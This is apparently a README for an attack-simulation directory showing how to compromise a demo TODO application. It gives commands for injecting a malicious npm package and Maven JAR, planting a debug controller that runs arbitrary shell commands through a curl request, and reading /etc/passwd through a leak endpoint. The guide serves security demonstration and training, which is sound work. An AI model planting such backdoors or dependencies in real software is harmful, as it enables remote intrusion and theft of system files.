# Attack Simulation Guide

This directory contains intentionally malicious code used to demonstrate several
ways an attacker could compromise the TODO application.

## Attack Scenarios

1. **Malicious npm package injection** – infect the React client by installing
   the locally built `evil-package`.
2. **Malicious Maven library injection** – add the `evil-lib` JAR to the Spring
   Boot backend.
3. **Remote shell backdoor** – copy a debug controller that executes arbitrary
   commands.
4. **Password leak endpoint** – the same controller exposes an endpoint that
   returns `/etc/passwd`.

---

### 1. Malicious npm package injection

1. Build the package:
   ```bash
   cd evil-package
   npm pack
   ```
   This produces a `.tgz` archive under `evil-package/`.

2. Infect the client application:
   ```bash
   cd ../../todo-client
   npm install ../malicious/evil-package/evil-package-1.0.0.tgz
   ```
   The archive is added to `package-lock.json`, mimicking a compromised
   dependency tree.

### 2. Malicious Maven library injection

1. Build and install the library to the local Maven repository:
   ```bash
   cd evil-lib
   mvn install -DskipTests
   ```

2. Add the dependency to the backend:
   ```bash
   cd ../../todo-api
   mvn install:install-file \
       -DgroupId=com.malicious \
       -DartifactId=evil-lib \
       -Dversion=1.0.0 \
       -Dpackaging=jar \
       -Dfile=../malicious/evil-lib/target/evil-lib-1.0.0.jar
   # Then update pom.xml to reference com.malicious:evil-lib:1.0.0
   ```
   The manual step mimics an attacker injecting the dependency after the build
   has started.

### 3. Remote shell backdoor

1. Copy the malicious controller into the API:
   ```bash
   cd malicious
   cp debug-controller/src/main/java/com/example/demo/DebugController.java \
      ../todo-api/src/main/java/com/example/demo/DebugController.java
   cd ..
   ```

2. Rebuild the application so the new endpoint is active:
   ```bash
   cd ../todo-api
   ./mvnw package -DskipTests
   ```

3. Execute arbitrary commands:
   ```bash
   curl "http://<todo-api-service>/debug-shell?cmd=whoami"
   ```

### 4. Password leak endpoint

With the debug controller installed, this call exfiltrates the host's
`/etc/passwd` file:

```bash
curl "http://<todo-api-service>/leak"
```
